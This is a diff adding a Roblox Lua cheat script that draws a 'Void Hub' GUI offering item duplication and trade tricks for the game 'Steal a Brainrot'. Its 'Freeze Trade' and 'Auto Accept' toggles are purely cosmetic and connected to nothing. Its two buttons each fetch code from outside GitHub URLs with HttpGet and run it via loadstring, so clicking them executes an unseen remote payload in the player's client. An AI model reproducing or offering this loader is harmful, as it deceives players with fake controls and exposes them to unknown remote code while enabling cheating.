@@ -1,0 +1,226 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "VoidHubUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 280, 0, 300)
+main.Position = UDim2.new(0.7, 0, 0.4, 0)
+main.BackgroundColor3 = Color3.fromRGB(8, 18, 45)
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = main
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(0, 140, 255)
+stroke.Thickness = 1.5
+stroke.Parent = main
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 25, 70)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 30))
+}
+gradient.Rotation = 90
+gradient.Parent = main
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundTransparency = 1
+title.Text = "Void Hub"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Parent = main
+
+local function createToggle(text, yPos)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.6, 0, 0, 30)
+    label.Position = UDim2.new(0, 15, 0, yPos)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 15
+    label.TextColor3 = Color3.fromRGB(200, 220, 255)
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = main
+
+    local toggle = Instance.new("Frame")
+    toggle.Size = UDim2.new(0, 55, 0, 24)
+    toggle.Position = UDim2.new(1, -70, 0, yPos + 3)
+    toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+    toggle.BorderSizePixel = 0
+    toggle.Parent = main
+
+    local tCorner = Instance.new("UICorner")
+    tCorner.CornerRadius = UDim.new(1, 0)
+    tCorner.Parent = toggle
+
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.new(0, 20, 0, 20)
+    knob.Position = UDim2.new(0, 2, 0.5, -10)
+    knob.BackgroundColor3 = Color3.fromRGB(255,255,255)
+    knob.BorderSizePixel = 0
+    knob.Parent = toggle
+
+    local kCorner = Instance.new("UICorner")
+    kCorner.CornerRadius = UDim.new(1, 0)
+    kCorner.Parent = knob
+
+    local state = false
+
+    toggle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            state = not state
+            if state then
+                toggle.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
+                knob:TweenPosition(UDim2.new(1, -22, 0.5, -10), "Out", "Quad", 0.2, true)
+            else
+                toggle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+                knob:TweenPosition(UDim2.new(0, 2, 0.5, -10), "Out", "Quad", 0.2, true)
+            end
+        end
+    end)
+end
+
+createToggle("Freeze Trade", 55)
+createToggle("Auto Accept", 95)
+
+local dupeButton = Instance.new("TextButton")
+dupeButton.Size = UDim2.new(0.9, 0, 0, 35)
+dupeButton.Position = UDim2.new(0.05, 0, 0, 140)
+dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+dupeButton.BorderSizePixel = 0
+dupeButton.Text = "Dupe Brainrots"
+dupeButton.Font = Enum.Font.GothamBold
+dupeButton.TextSize = 16
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeButton.Parent = main
+
+local dupeCorner = Instance.new("UICorner")
+dupeCorner.CornerRadius = UDim.new(0, 8)
+dupeCorner.Parent = dupeButton
+
+local dupeStroke = Instance.new("UIStroke")
+dupeStroke.Color = Color3.fromRGB(0, 200, 255)
+dupeStroke.Thickness = 1
+dupeStroke.Parent = dupeButton
+
+dupeButton.MouseEnter:Connect(function()
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    dupeStroke.Color = Color3.fromRGB(100, 220, 255)
+end)
+
+dupeButton.MouseLeave:Connect(function()
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    dupeStroke.Color = Color3.fromRGB(0, 200, 255)
+end)
+
+dupeButton.MouseButton1Click:Connect(function()
+    dupeButton.Text = "Loading..."
+    dupeButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/GrowaGarden/refs/heads/main/Oii"))()
+    end)
+
+    if success then
+        dupeButton.Text = "Executed!"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+        wait(1.5)
+        dupeButton.Text = "Dupe Brainrots"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    else
+        dupeButton.Text = "Error!"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        wait(1.5)
+        dupeButton.Text = "Dupe Brainrots"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+    end
+end)
+
+local ogButton = Instance.new("TextButton")
+ogButton.Size = UDim2.new(0.9, 0, 0, 35)
+ogButton.Position = UDim2.new(0.05, 0, 0, 220)
+ogButton.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+ogButton.BorderSizePixel = 0
+ogButton.Text = "OG Lucky Block"
+ogButton.Font = Enum.Font.GothamBold
+ogButton.TextSize = 16
+ogButton.TextColor3 = Color3.fromRGB(255,255,255)
+ogButton.Parent = main
+
+local ogCorner = Instance.new("UICorner")
+ogCorner.CornerRadius = UDim.new(0,8)
+ogCorner.Parent = ogButton
+
+local ogStroke = Instance.new("UIStroke")
+ogStroke.Color = Color3.fromRGB(0,200,255)
+ogStroke.Thickness = 1
+ogStroke.Parent = ogButton
+
+ogButton.MouseEnter:Connect(function()
+    ogButton.BackgroundColor3 = Color3.fromRGB(0,170,255)
+    ogStroke.Color = Color3.fromRGB(100,220,255)
+end)
+
+ogButton.MouseLeave:Connect(function()
+    ogButton.BackgroundColor3 = Color3.fromRGB(0,140,255)
+    ogStroke.Color = Color3.fromRGB(0,200,255)
+end)
+
+ogButton.MouseButton1Click:Connect(function()
+    ogButton.Text = "Secret Lucky Block Needed"
+    ogButton.BackgroundColor3 = Color3.fromRGB(255,170,0)
+    wait(2)
+
+    ogButton.Text = "Loading..."
+    ogButton.BackgroundColor3 = Color3.fromRGB(0,100,200)
+
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/OGBlock.lua"))()
+    end)
+
+    ogButton.Text = "Executed!"
+    ogButton.BackgroundColor3 = Color3.fromRGB(0,200,100)
+    wait(1.5)
+
+    ogButton.Text = "OG Lucky Block"
+    ogButton.BackgroundColor3 = Color3.fromRGB(0,140,255)
+end)
+
+local dragging = false
+local dragStart
+local startPos
+
+main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        main.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
